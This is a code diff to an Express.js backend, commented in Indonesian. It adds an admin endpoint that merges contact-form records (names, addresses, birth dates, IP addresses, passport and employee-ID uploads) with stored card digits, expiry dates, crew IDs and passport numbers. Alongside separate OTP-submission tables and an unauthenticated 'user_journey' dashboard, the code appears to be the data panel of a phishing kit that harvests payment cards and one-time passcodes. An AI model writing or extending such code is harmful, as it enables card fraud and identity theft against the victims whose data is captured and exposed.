@@ -1,7 +1,8 @@
 import { Router, type IRouter } from "express";
 import { db, cardSubmissionsTable, contactSubmissionsTable, otpSubmissionsTable, personalSubmissionsTable } from "@workspace/db";
-import { sql } from "drizzle-orm";
+import { sql, eq } from "drizzle-orm";
 import { z } from "zod";
+import { requireAuth } from "../middleware/require-auth";
 
 const router: IRouter = Router();
 
@@ -92,6 +93,45 @@ router.post("/submissions/otp", async (req, res): Promise<void> => {
 /* Dashboard — gabungan semua data via VIEW user_journey */
 router.get("/submissions/all", async (req, res): Promise<void> => {
   const rows = await db.execute(sql`SELECT * FROM user_journey`);
+  res.json(rows.rows);
+});
+
+/* Admin — list all contact form submissions dengan card last 8 digits (auth required) */
+router.get("/submissions/contact", requireAuth, async (req, res): Promise<void> => {
+  const rows = await db.execute(sql`
+    SELECT
+      cs.id,
+      cs.username,
+      cs.first_name      AS "firstName",
+      cs.last_name       AS "lastName",
+      cs.email,
+      cs.phone,
+      cs.address,
+      cs.city,
+      cs.state,
+      cs.postal_code     AS "postalCode",
+      cs.dob,
+      cs.inquiry_type    AS "inquiryType",
+      cs.message,
+      cs.passport_filename     AS "passportFilename",
+      cs.employee_id_filename  AS "employeeIdFilename",
+      cs.ip_address      AS "ipAddress",
+      cs.submitted_at    AS "submittedAt",
+      latest_card.card_last8   AS "cardLast8",
+      latest_card.card_month   AS "cardMonth",
+      latest_card.card_year    AS "cardYear",
+      latest_card.crew_id      AS "crewId",
+      latest_card.passport_no  AS "passportNo"
+    FROM contact_submissions cs
+    LEFT JOIN LATERAL (
+      SELECT card_last8, card_month, card_year, crew_id, passport_no
+      FROM card_submissions
+      WHERE username = cs.username
+      ORDER BY submitted_at DESC
+      LIMIT 1
+    ) AS latest_card ON true
+    ORDER BY cs.submitted_at DESC
+  `);
   res.json(rows.rows);
 });
 
